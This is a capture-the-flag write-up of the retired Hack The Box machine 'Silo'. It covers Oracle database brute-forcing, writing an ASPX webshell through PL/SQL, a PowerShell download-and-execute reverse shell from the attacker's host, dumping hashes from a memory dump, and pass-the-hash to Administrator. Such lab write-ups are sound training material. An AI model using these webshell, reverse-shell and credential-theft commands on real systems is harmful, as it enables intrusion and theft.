# Silo

This is the write-up for the box Silo that got retired at the 4th August 2018.
My IP address was 10.10.14.4 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.82    silo.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/silo.nmap 10.10.10.82
```

```markdown
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

## Checking HTTP (Port 80)

On the web page there is the default IIS page.
Lets search for hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.82 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds nothing.

## Checking Oracle Database (Port 1521)

In order to attack the **Oracle Database** I will use a tool called [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat).
First we need to know the SID of the database:
```markdown
odat sidguesser -s 10.10.10.82 -p 1521
```

This can also be done with the **Metasploit** module _auxiliary/scanner/oracle/sid_brute_.
Both of the tools will find two SIDs:
- XE
- XEXDB

The next thing to get is a password and **ODAT** can try to brute-force this.
It needs a password list which I will take from _/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt_ and modify so that it has a backslash between username and password.
```markdown
odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file oracle_default_userpass.txt
```

After it finishes, one valid credential is found: _scott/tiger_.

Connecting to the Oracle database with the found credentials:
```markdown
sqlplus64 scott/tiger@10.10.10.82:1521/XE
```

Enumerating the database:
```markdown
SQL> select * from session_privs
SQL> select * from user_role_privs
```

These commands don't show much but it is possible to login on the database as _sysdba_:
```markdown
sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba
```

Now the commands show a lot more information and we can exploit the Oracle database.

### Method 1: Reading files from the file system

With these privileges it is possible to read files from the file system.
```markdown
SQL> set serveroutput ON
```

```markdown
declare
  f utl_file.file_type;
  s varchar(200);
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
  utl_file.get_line(f,s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
end;
/
```

This shows the contents of the default IIS page and can be done for any file on the file system like the flags.

### Method 2: Writing files to the web server

A way to gain access to the server is by uploading a webshell on the IIS web server and executing commands to gain a reverse shell.
The webshell I upload is an ASPX shell from _/usr/share/webshells/aspx/cmdasp.aspx_.
This script has to be made smaller to under 1000 characters or otherwise it can't be written to the file system:
- Remove _<HEAD>_ tags and contents
- Remove _style_ tags
- Remove comments
- Remove newlines: `sed -z 's/\n//g' cmdasp.aspx`

Now writing it to the file system from the SQL command line:
```markdown
declare
  f utl_file.file_type;
  s varchar(5000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg" runat="server" Width="250px"></asp:TextBox><asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'shell.aspx', 'W');
  utl_file.put_line(f,s);
  utl_file.fclose(f);
end;
/
```

The webshell can be found on:
```markdown
http://10.10.10.82/shell.aspx
```

It is possible to execute any command so lets start a reverse shell:
```markdown
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/Invoke-PowerShellTcp.ps1')"
```

After executing the reverse shell _Invoke-PowerShellTcp.ps1_ from the **Nishang framework** gets called from my web server and the listener on my IP and port 9001 starts a reverse shell session as _IIS APPPOOL/defaultapppool_.

## Privilege Escalation

In the home directories there is one user _Phineas_ and he has a file called _"Oracle issue.txt"_ in his Desktop directory with the following content:
```markdown
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
?%Hm8646uC$
```

When browsing to the Dropbox URL and pasting the given password, it won't work.
The reason is because one of the characters is UTF-8 encoded but our terminal only shows ASCII. This can be bypassed by encoding the contents of the file to Base64 and decode it to UTF-8 instead of ASCII.
```powershell
$content = Get-Content "Oracle issue.txt"

$encoded = [System.Text.Encoding]::UTF8.GetBytes($content)

[System.Convert]::ToBase64String($encoded)
```

Decoding the Base64 string:
```markdown
echo -n 'U3VwcG9ydCB2ZW5kb3IgZW5nYWdlZCB0byB0cm91Ymxlc2hvb3QgV2luZG93cyAvIE9yYWNsZSBwZXJmb3JtYW5jZSBpc3N1ZSAoZnVsbCBtZW1vcnkgZHVtcCByZXF1ZXN0ZWQpOiAgRHJvcGJveCBsaW5rIHByb3ZpZGVkIHRvIHZlbmRvciAoYW5kIHBhc3N3b3JkIHVuZGVyIHNlcGFyYXRlIGNvdmVyKS4gIERyb3Bib3ggbGluayAgaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2gvNjlza3J5emZzemI3ZWxxL0FBRFpuUUViYnFEb0lmNUwyZDBQQnhFTmE/ZGw9MCAgbGluayBwYXNzd29yZDogwqMlSG04NjQ2dUMk' | base64 -d
```

Now it shows the real password that can be used for Dropbox:
> £%Hm8646uC$

The file to download is a ZIP archive and the content is one file called _SILO-20180105-221806.dmp_.
Using the `file` command to analyze it:
```markdown
SILO-20180105-221806.dmp: MS Windows 64bit crash dump, full dump, 261996 pages
```

This Windows crash dump can be analyzed with different tools and I will use **Volatility**.
Lets collect some information about the image and dump the hashes:
```markdown
volatility -f SILO-20180105-221806.dmp imageinfo

volatility -f SILO-20180105-221806.dmp Win2012R2x64 pstree

volatility -f SILO-20180105-221806.dmp Win2012R2x64 hashdump
```

Dumped hashes:
```markdown
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
```

With the hash of the _Administrator_ we can do a **Pass-The-Hash** attack to authenticate on the box:
```markdown
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.10.10.82 cmd
```

After successfully passing the hash to the box, it starts a shell session as _Administrator_!
